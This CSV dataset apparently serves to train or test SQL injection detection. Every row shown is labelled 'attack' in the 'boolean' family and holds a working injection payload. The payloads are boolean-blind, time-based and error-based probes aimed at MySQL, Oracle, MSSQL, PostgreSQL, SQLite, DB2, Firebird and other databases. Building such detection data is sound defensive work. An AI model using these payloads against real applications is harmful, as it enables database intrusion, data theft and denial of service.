label,payload,family
attack,"1'+  (  select 'zohk' where 5502  =  5502 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,boolean
attack,"1'+  (  select 'qrml' where 3791  =  3791 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",boolean
attack,-1603'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'abmo'  =  'abmo,boolean
attack,"1 where 7051  =  7051 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,"1""  )   and   (  3020  =  3020  )  *6703 and   (  ""hkjf""  =  ""hkjf",boolean
attack,"1%""  )   and   (  6016  =  4763  )  *4763 and   (  ""%""  =  """,boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,boolean
attack,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",boolean
attack,1'  )   and 9198  =  9198--,boolean
attack,"1""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""nbfe""  =  ""nbfe",boolean
attack,"1'||  (  select 'ftey' where 1363  =  1363 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",boolean
attack,-5137  )   or 9323  =  9323#,boolean
attack,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",boolean
attack,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,-4892%'   )    )    or 2251  =  9881--,boolean
attack,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",boolean
attack,1' and 1541  =  6868#,boolean
attack,"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"-9295   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  8752  =  8752",boolean
attack,"1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,1%' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  ',boolean
attack,"1%' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",boolean
attack,"-9881""   )    )    or 9850  =  8118#",boolean
attack,-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,boolean
attack,"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",boolean
attack,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",boolean
attack,"-3081""   )    )     )   or 3736  =  1899",boolean
attack,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,boolean
attack,"1%'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  '%'  =  '",boolean
attack,"1""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""wjhj""  =  ""wjhj",boolean
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean
attack," end and    (    (   ""%""  =  """,boolean
attack,"1%""  )   and   (  3020  =  3020  )  *6703 and   (  ""%""  =  """,boolean
attack,"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,-6045 or 8919  =  2827--,boolean
attack,"1""   )    )    as khqq where 3637  =  3637 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,-7505'   )    )    as lqvw where 8565  =  8565 or 6872  =  6872--,boolean
attack," end and   (  ""xksk""  =  ""xksk",boolean
attack,"1'  )   and elt  (  3528  =  3566,3566  )  ",boolean
attack,1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,boolean
attack,"1'   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,1  )   as qgsb where 7600  =  7600 and 2006  =  2006,boolean
attack,1' where 4795  =  4795 and 4595  =  4595#,boolean
attack,"1""  )   as rnte where 6517  =  6517 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"-2548""   )    )     )   or 5107  =  8049--",boolean
attack,"1%' and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",boolean
attack,1'  )   and 4595  =  4595#,boolean
attack,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",boolean
attack,"1%' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bxcb"" like ""bxcb",boolean
attack,"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",boolean
attack,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",boolean
attack,"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1  )   where 4698  =  4698 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||'",boolean
attack,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1""  )   where 9285  =  9285 and 8506  =  8343#",boolean
attack,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',boolean
attack,-6200%'   )    )    or 8077  =  4661,boolean
attack,"-6846%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean
attack,1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,boolean
attack,"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",boolean
attack,"1"" or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""menm"" like ""menm",boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj",boolean
attack,"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",boolean
attack,-9336' or 5641  =  9488#,boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",boolean
attack,-5026' or   (  8459  =  8459  )  *4906 and 'uavj' like 'uavj,boolean
attack,"1  )   as wust where 3884  =  3884 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc",boolean
attack,"1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa",boolean
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",boolean
attack,"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,boolean
attack,-3096' or 3821  =  5539 and 'zrth'  =  'zrth,boolean
attack,"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb",boolean
attack,"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1""  )   where 4567  =  4567 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"-3637"" or   (  8459  =  8459  )  *4906",boolean
attack,-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202,boolean
attack,"1%'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",boolean
attack,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",boolean
attack,"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue",boolean
attack,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",boolean
attack,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk",boolean
attack,"-6747"" or 9323  =  9323#",boolean
attack,-1219'  )   or 5592  =  4835,boolean
attack,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'wmoo' like 'wmoo",boolean
attack,"1'  )   where 9221  =  9221 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",boolean
attack,-1890'   )    )     )   or 8526  =  1389 and    (    (     (  'ecgt'  =  'ecgt,boolean
attack,"1""   )    )    and 2006  =  2006",boolean
attack,"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"-1425""  )   where 8056  =  8056 or elt  (  1032  =  1032,3623  )  --",boolean
attack,end and    (    (   'eqoc' like 'eqoc,boolean
attack,"-6076""   )    )    or 8277  =  4757",boolean
attack,"1' where 6795  =  6795 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,"1'||  (  select 'epjf' from dual where 8584  =  8584 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,1  )   where 9860  =  9860 and 4443  =  4111--,boolean
attack,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'cimm' like 'cimm",boolean
attack,1%' and 7533  =  7533 and '%'  =  ',boolean
attack,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",boolean
attack,"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,boolean
attack,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
